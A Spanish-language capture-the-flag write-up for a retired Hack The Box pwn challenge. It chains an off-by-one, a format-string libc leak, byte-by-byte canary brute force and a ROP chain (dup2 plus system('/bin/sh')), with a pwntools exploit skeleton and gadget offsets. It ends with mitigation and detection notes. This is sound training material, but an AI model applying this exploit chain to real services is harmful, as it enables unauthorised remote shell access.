---
challenge: Forks and Knives
category: Challenge
type: Pwn
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [pwn, format-string, canary, rop, libc, fork]
---

# Forks and Knives — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Servidor que hace `fork()` por conexión, con tres fallos encadenados: un off-by-one que pone a cero el flag de manager, un format string de cuatro bytes que filtra una dirección de libc y un desbordamiento con canario. Como el hijo hereda el canario y la base de libc del padre, el canario se fuerza byte a byte y el ROP final llama a `system("/bin/sh")` tras redirigir stdio al socket.

## Enunciado y superficie

- Categoría **Pwn**, dificultad **Medium**.
- Entrega `Dockerfile`, `build-docker.sh`, `challenge/server` y `challenge/libc.so.6`.
- El flag vive en `/home/ctf/flag*.txt` y el servicio escucha en 1337.

```bash
file challenge/server
checksec --file=challenge/server
```

```text
ELF 64-bit LSB pie executable, x86-64
Full RELRO · Canary found · NX enabled · PIE enabled
GLIBC 2.35
```

## Reconocimiento

```bash
./challenge/server
nc <IP> 1337
```

El menú ofrece reservar, ver y limpiar reservas; las opciones 5 y 6 están restringidas a manager.

## Análisis del código

En el desensamblado se ven tres cosas:

- `read(fd, name_buf, 16)` seguido de `name_buf[n] = '\0'`: con 16 bytes, el terminador cae en `not_manager`.
- La reserva se construye con `snprintf(buf, ..., "Table for %s", input)` y luego se pasa a `fprintf(file, buf)`: el `%` del usuario se interpreta.
- La lectura de la respuesta usa `read(fd, buf + n, 0x100)` sobre un búfer de `0x100`, lo que permite escribir desde `rbp-0x10`.

## Explicación del fallo

```text
BSS:   name_buf[16] @0x4030 | not_manager @0x4040
Pila:  order_buf[256] @rbp-0x110 | gap 8 | canary @rbp-0x08 | rbp | ret
```

1. **Manager:** 16 bytes exactos sin salto de línea → `not_manager = 0` → se abren las opciones 5 y 6.
2. **Leak:** el format string está limitado a 4 bytes, así que se usan posicionales; `%2$p` devuelve un valor de `lseek64` y `libc_base = leak - 0x8c91b`.
3. **Canario:** al no re-ejecutarse el binario, el canario es constante entre conexiones; se prueba byte a byte (el primero es `\x00`) hasta que el hijo sobrevive.
4. **ROP:** `b'X'*8 + canary + b'Y'*8 + cadena`, con `dup2(4,0..2)` y `system("/bin/sh")`.

## Reproducción local

```bash
docker build -t forks .
docker run --rm -p 1337:1337 forks
python3 -c "from pwn import *; print(cyclic(300))"
```

Con `gdb` y `gef`, `pattern search` sobre `$rsp` confirma el offset; `vmmap` da la base de libc para validar el cálculo del leak.

## Explotación

```python
from pwn import *
context.binary = elf = ELF('challenge/server')
libc = ELF('challenge/libc.so.6')

io = remote('<IP>', 1337)
io.send(b'A'*16)                  # not_manager = 0
# reservar con %2$p, leer la reserva, calcular libc_base
# forzar el canario byte a byte
rop  = p64(libc_base + 0x2a3e5)   # pop rdi; ret
rop += p64(4)
rop += p64(libc_base + 0x2be51)   # pop rsi; ret
rop += p64(0)
rop += p64(libc_base + 0x2be53)   # pop rdx; ... (ver build)
rop += p64(libc_base + 0x45eb0)   # pop rax; ret
rop += p64(33)                    # dup2
rop += p64(libc_base + 0x91316)   # syscall; ret
# repetir para 1 y 2, luego system("/bin/sh")
```

Offsets de referencia del build: `pop rdi` `0x2a3e5`, `pop rsi` `0x2be51`, `syscall` `0x91316`, `/bin/sh` `0x1d8678`. Cambian con otra libc; hay que recalcularlos con `ROPgadget` o `ropper`.

## Evidencia

- `checksec` con las cinco protecciones.
- Leak alineado a página (`...000`).
- Canario recuperado y `cat /home/ctf/flag*` con la salida recortada.

## Lecciones aprendidas

- `fork()` sin `exec()` conserva canario y ASLR: el brute force es viable y hay que aprovecharlo.
- Un off-by-one de un solo byte puede desbloquear toda la aplicación.
- Un format string de 4 bytes obliga a posicionales; no cabe `%n` ni texto largo.
- `dup2` al descriptor del cliente es imprescindible: el hijo no hereda stdout del socket.
- Los offsets de libc se verifican contra el fichero entregado, nunca de memoria.

## Mitigaciones y detección

- Leer con `read(fd, buf, sizeof(buf)-1)` y terminar explícitamente; no escribir el NUL fuera del rango.
- Pasar la entrada como argumento (`"%s"`) en `fprintf`, nunca como formato.
- Recompilar con `-D_FORTIFY_SOURCE=2` y usar `snprintf` con tamaños correctos.
- Detección: procesos que mueren por `__stack_chk_fail`, cadenas con `%p` repetidos y conexiones que sobreviven a fallos de canario.
- Referencias: CWE-193 (off-by-one), CWE-134 (format string), MITRE T1190.

## Referencias

- <https://www.hackthebox.com/challenges/forks-and-knives>
- <https://blog.beatman.tw/en/articles/69ed65acc3a1bf5c78cef870>
- <https://mateimartin.github.io/blog/forks_and_knives>
- <https://github.com/Tejaswivallapu/forks-and-knives>
